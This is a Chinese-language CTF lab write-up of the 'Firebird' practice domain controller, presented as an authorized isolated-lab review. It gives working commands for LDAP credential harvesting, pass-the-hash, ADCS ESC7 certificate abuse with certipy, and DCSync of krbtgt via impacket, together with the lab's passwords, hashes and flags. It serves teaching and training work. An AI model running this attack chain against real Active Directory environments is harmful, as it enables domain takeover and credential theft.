# Firebird 域控入门复盘：LDAP 凭据到 ADCS ESC7

> 本文记录的是隔离环境中的授权靶机复盘。域内横向、证书滥用与票据伪造均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | Firebird（kaada 域控入门） |
| 目标 | `192.168.135.141` |
| 主机名 / 域名 | `FIREBIRD` / `firebird.local` |
| 系统 | Windows Server 2022 |
| 初始凭据 | `ll104567` / `Pass_123456!`（过期后改为 `Pass_123456!!`） |
| 最终路径 | LDAP `info` 出 `111` → `DB_Vault` 出 `sublarge` 哈希 → ESC7 拿管理员证书 → PtH / DCSync → flag |

![nmap -sn 扫存活主机](/content/firebird/image-01.png)

![全端口扫描：88 / 389 / 3268 齐](/content/firebird/image-02.png)

## 1. 攻击链概览

这是一台标准域控入门箱：入口账号几乎没权限，情报全在 LDAP 属性和共享配置文件里；真正的提权面是 **ADCS ESC7**（`CertManagers_Group` 同时有 ManageCA / ManageCertificates），自批自签拿 `administrator` 证书后 DCSync。

```text
nxc：88 + 389 + 3268 → 域控；SMB 签名开、无 SMBv1
  → ll104567 密码过期 → changepasswd → Pass_123456!!
  → LDAP 枚举：info 明文 → 111 / Ldap_P@ssw0rd_2026!
  → 111 密码过期 → Ldap_P@ssw0rd_2026!!
  → DB_Vault\db_config.ini → sublarge NTLM
  → 哈希改密 → Sublarge_P@ssw0rd_2026!
  → CertManagers_Group + Remote Management Users
  → ESC7：加 Officer → SubCA 申请 admin → 自批 → 取证
  → administrator 哈希 → WinRM / secretsdump → krbtgt
  → user.txt / root.txt
```

## 2. 侦察：一眼域控

开端口里只要同时看到 Kerberos + LDAP + Global Catalog，基本就能定域控：

![域控特征端口对照](/content/firebird/image-03.png)

```text
主机名：FIREBIRD
域名：firebird.local
88 + 389 + 3268 → 基本可以直接判定是域控
```

`nxc smb` 再确认签名与 SMBv1；初始账密能认人，但返回 `STATUS_PASSWORD_EXPIRED`：

![SMB 指纹与密码过期](/content/firebird/image-04.png)

| 项 | 值 | 含义 |
|----|-----|------|
| signing | True | SMB 签名强制开启 |
| SMBv1 | False | 没有永恒之蓝那类老洞 |

过期密码用 `changepasswd` 改成 `Pass_123456!!`，顺手拉密码策略——**无锁定阈值、复杂度全关**：

```bash
impacket-changepasswd -newpass 'Pass_123456!!' \
  'firebird.local/ll104567:Pass_123456!@192.168.135.141'

nxc smb 192.168.135.141 -u ll104567 -p 'Pass_123456!!' --pass-pol
```

![改密成功并读密码策略](/content/firebird/image-05.png)

## 3. AD 信息收集：`ll104567` 没特权

先枚举域用户，能看到 `111`、`sublarge` 等目标账号：

![nxc ldap --users 枚举域用户](/content/firebird/image-06.png)

策略侧再确认一遍：Account Lockout Threshold = None，喷密/枚举不怕锁：

![密码策略：无锁定、无复杂度](/content/firebird/image-07.png)

Kerberoasting / AS-REP Roasting 都是空的，这条路不通：

![GetUserSPNs / GetNPUsers 均无结果](/content/firebird/image-08.png)

改走 BloodHound 采全量，再本地脚本看 `ll104567` 权限：

![bloodhound-python 采集](/content/firebird/image-09.png)

![ll104567 无出边权限](/content/firebird/image-10.png)

入口用户在域里几乎是路人。真正有用的线索在对象属性里。

## 4. 横向：`111` 与 `DB_Vault`

把用户对象 dump 出来，再筛常见「备注类」属性——`info` 里直接写了 `111` 的明文：

```bash
ldapsearch -o ldif-wrap=no -x -H ldap://192.168.135.141 \
  -D 'll104567@firebird.local' -w 'Pass_123456!!' \
  -b 'dc=firebird,dc=local' '(objectClass=user)' > loot/ldap_users_raw.txt

grep -E '^(dn|sAMAccountName|info|comment|notes|description):' loot/ldap_users_raw.txt
# info: ... Assigned credential: Ldap_P@ssw0rd_2026!
```

![LDAP info 属性里的 111 明文](/content/firebird/image-11.png)

`111` 同样密码过期，改成 `Ldap_P@ssw0rd_2026!!` 后再验：

```bash
nxc smb 192.168.135.141 -u 111 -p 'Ldap_P@ssw0rd_2026!'
# STATUS_PASSWORD_EXPIRED

impacket-changepasswd -newpass 'Ldap_P@ssw0rd_2026!!' \
  'firebird.local/111:Ldap_P@ssw0rd_2026!@192.168.135.141'

nxc smb 192.168.135.141 -u 111 -p 'Ldap_P@ssw0rd_2026!!'
# [+] firebird.local\111:...
```

![111 改密并验证通过](/content/firebird/image-12.png)

以 `111` 列共享，`DB_Vault` 变为 READ：

![--shares：DB_Vault 可读](/content/firebird/image-13.png)

```bash
# smbclient：-U '域名/用户%密码'；impacket 习惯用 用户:密码@主机
smbclient //192.168.135.141/DB_Vault \
  -U 'firebird.local/111%Ldap_P@ssw0rd_2026!!' -c 'ls'

smbclient //192.168.135.141/DB_Vault \
  -U 'firebird.local/111%Ldap_P@ssw0rd_2026!!' \
  -c 'get db_config.ini loot/db_config.ini'
```

![从 DB_Vault 拉取 db_config.ini](/content/firebird/image-14.png)

![BackupHash 即 sublarge 的 NTLM](/content/firebird/image-15.png)

```ini
[Database Service Configuration]
ServiceAccount=firebird\sublarge
AuthType=NTLM
BackupHash=2d9b24ded78750921eecd7dfea8d54ae
LastUpdate=2026-07-21
```

## 5. `sublarge`：证书组 + WinRM

NTLM 认证只认哈希，不认明文——拿到哈希就能冒充：

![Pass-the-Hash 原理](/content/firebird/image-16.png)

哈希能认，但账号也过期——用旧哈希改明文为 `Sublarge_P@ssw0rd_2026!`：

```bash
nxc smb 192.168.135.141 -u sublarge -H 2d9b24ded78750921eecd7dfea8d54ae
# STATUS_PASSWORD_EXPIRED

impacket-changepasswd -hashes ':2d9b24ded78750921eecd7dfea8d54ae' \
  -newpass 'Sublarge_P@ssw0rd_2026!' \
  'firebird.local/sublarge@192.168.135.141'

nxc smb 192.168.135.141 -u sublarge -p 'Sublarge_P@ssw0rd_2026!'
```

![哈希改密后明文登录成功](/content/firebird/image-17.png)

查组成员：

```bash
ldapsearch -o ldif-wrap=no -x -H ldap://192.168.135.141 \
  -D 'sublarge@firebird.local' -w 'Sublarge_P@ssw0rd_2026!' \
  -b 'dc=firebird,dc=local' '(sAMAccountName=sublarge)' memberOf
```

![sublarge ∈ CertManagers + Remote Management](/content/firebird/image-18.png)

| 组 | 含义 |
|----|------|
| CertManagers_Group | 证书管理相关 → 盯 ADCS |
| Remote Management Users | 可走 WinRM（5985）远程执行 |

## 6. ADCS ESC7：自批自签

```bash
nxc ldap 192.168.135.141 -u sublarge -p 'Sublarge_P@ssw0rd_2026!' -M adcs
# CA: firebird-FIREBIRD-CA
# Enrollment: firebird.firebird.local

certipy-ad find -u 'sublarge@firebird.local' -p 'Sublarge_P@ssw0rd_2026!' \
  -dc-ip 192.168.135.141 -ns 192.168.135.141 -stdout
```

`-ns 192.168.135.141`：ADCS 强依赖域名解析，证书 subject 是 FQDN（`firebird.firebird.local`），不指定 DNS 容易解析失败。

![发现 CA：firebird-FIREBIRD-CA](/content/firebird/image-19.png)

![ESC7：CertManagers_Group 危险权限](/content/firebird/image-20.png)

![筛证书模板配置](/content/firebird/image-21.png)

**ESC7 判定：** 普通主体拿到 CA 上的 **ManageCA** 和/或 **ManageCertificates**。本题 `CertManagers_Group` 两项都命中——等于把签发机关的管理权交给了这组人。

攻击闭环（自批）：

```bash
# 1) ManageCA：把自己加成 Officer
certipy-ad ca -u 'sublarge@firebird.local' -p 'Sublarge_P@ssw0rd_2026!' \
  -ca 'firebird-FIREBIRD-CA' -dc-ip 192.168.135.141 -ns 192.168.135.141 \
  -add-officer sublarge

# 2) 用 SubCA 模板申请 administrator@firebird.local
#    会先被拒（TEMPLATE_DENIED），但留下 Request ID + 私钥
certipy-ad req -u 'sublarge@firebird.local' -p 'Sublarge_P@ssw0rd_2026!' \
  -ca 'firebird-FIREBIRD-CA' -template SubCA \
  -upn 'administrator@firebird.local' \
  -dc-ip 192.168.135.141 -ns 192.168.135.141 -out admin_esc7

# 3) Officer：自己签发刚才的请求
certipy-ad ca -issue-request <RequestID> ...

# 4) 取回证书
certipy-ad req -retrieve <RequestID> ...
```

![加 Officer，申请留下 Request ID 3](/content/firebird/image-22.png)

![自批签发并取回 administrator 证书](/content/firebird/image-23.png)

核心缺陷：**提交请求**和**批准请求**没拆权——同一身份两头都能做，校验就空了。

证书到手后打成 PFX（空密码），再认证换成 `administrator` 的 NTLM：

```bash
openssl pkcs12 -export -out admin_esc7.pfx \
  -inkey admin_esc7.key -in admin_esc7.crt -passout pass:
```

![打包 admin_esc7.pfx](/content/firebird/image-24.png)

![证书认证拿到管理员 NTLM](/content/firebird/image-25.png)

得到管理员 NTLM：`9fbb1566fa1ff2c13c56255d7e360635`。

## 7. 拿下域控：DCSync、黄金票据、flag

```bash
nxc winrm 192.168.135.141 -u administrator -H '9fbb1566fa1ff2c13c56255d7e360635'
# (Pwn3d!)

impacket-secretsdump -just-dc \
  'firebird.local/administrator@firebird.local' \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:9fbb1566fa1ff2c13c56255d7e360635' \
  -dc-ip 192.168.135.141
```

![WinRM 管理员 + DCSync 出 krbtgt](/content/firebird/image-26.png)

其中 **`krbtgt`** 的哈希是 Kerberos「根密钥」——可伪造任意用户 TGT（黄金票据）；密码要**改两次**旧票才彻底失效，改一次往往新旧都还能用。本题导出：

```text
krbtgt:502:...:371cf89ba25810381fad3a70a2780e07:::
```

交互进箱：

```bash
evil-winrm -i 192.168.135.141 -u administrator -H '9fbb1566fa1ff2c13c56255d7e360635'
```

![evil-winrm 以 administrator 进箱](/content/firebird/image-27.png)

找 flag：

```text
C:\Users\sublarge\Desktop\user.txt
9585e7f18c514320a7a150d932481734

C:\Users\Administrator.FIREBIRD_DOM\Desktop\root.txt
b883e584300f4961a6b3ef9f6ad4bf69
```

![定位并读取 user / root flag](/content/firebird/image-28.png)

## 8. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| 端口指纹 | 88+389+3268 ≈ 域控；再看签名 / SMBv1 排除老洞 |
| 密码过期 | 能认人却登不上时，优先 `changepasswd`（含哈希改密） |
| LDAP `info` | 非标准属性也常塞明文；枚举别只看 memberOf |
| 共享配置 | `DB_Vault` 的 ini 把服务账号 NTLM 当「备份字段」留下 |
| ESC7 | ManageCA + ManageCertificates → 自加成 Officer → 自批 SubCA |
| ADCS DNS | `-ns` 指到 DC，避免 FQDN 解析失败 |
| krbtgt | DCSync 后的持久化顶配；改密要两次才真正吊销旧黄金票 |
| flag 位置 | user 在 `sublarge` 桌面，root 在域管桌面 |

## 9. 复盘

Firebird 把域控入门三件事串得很清楚：**属性里找下一跳凭据、共享里找可冒充哈希、证书服务里找可自批的管理权**。`ll104567` 本身没特权不要紧；真正危险的是 `CertManagers_Group` 把 CA 管理权交出去，再叠一层「申请与签发同一人」。打完 ESC7 之后，WinRM + DCSync 只是收尾。
